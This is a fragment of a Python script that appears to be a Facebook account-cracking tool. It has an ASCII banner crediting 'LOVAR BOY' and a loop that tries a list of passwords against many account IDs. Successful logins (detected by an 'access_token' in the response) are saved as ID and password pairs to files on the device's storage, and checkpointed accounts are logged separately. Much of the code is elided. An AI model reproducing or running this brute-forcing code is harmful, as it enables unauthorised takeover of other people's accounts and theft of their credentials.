...
def __banner___():
    print(f"""\033[1;32m.----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   _____      | || |     ____     | || | ____   ____  | || |      __      | || |  _______     | |
| |  |_   _|     | || |   .'    `.   | || ||_  _| |_  _| | || |     /  \     | || | |_   __ \    | |
| |    | |       | || |  /  .--.  \  | || |  \ \   / /   | || |    / /\ \    | || |   | |__) |   | |
| |    | |   _   | || |  | |    | |  | || |   \ \ / /    | || |   / ____ \   | || |   |  __ /    | |
| |   _| |__/ |  | || |  \  `--'  /  | || |    \ ' /     | || | _/ /    \ \_ | || |  _| |  \ \_  | |
| |  |________|  | || |   `.____.'   | || |     \_/      | || ||____|  |____|| || | |____| |___| | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
  .----------------.  .----------------.  .----------------.                                        
 ...
 | '--------------' || '--------------' || '--------------' |                                       
  '----------------'  '----------------'  '----------------'    
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mFB         :  LOVAR BOY              
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mGITHUB     :  LOVAR BOY              
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mVERSIONS   :  \033[1;37m0.1                   
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
os.system('clear')
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mLOVAR BOY-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[LOVAR BOY-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/LOVAR BOY-OKS.txt','a').write(ids+' | '+pas+'\n')
                ...
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        #print('\r\r\033[1;30m [LOVAR BOY-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LOVAR BOY-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
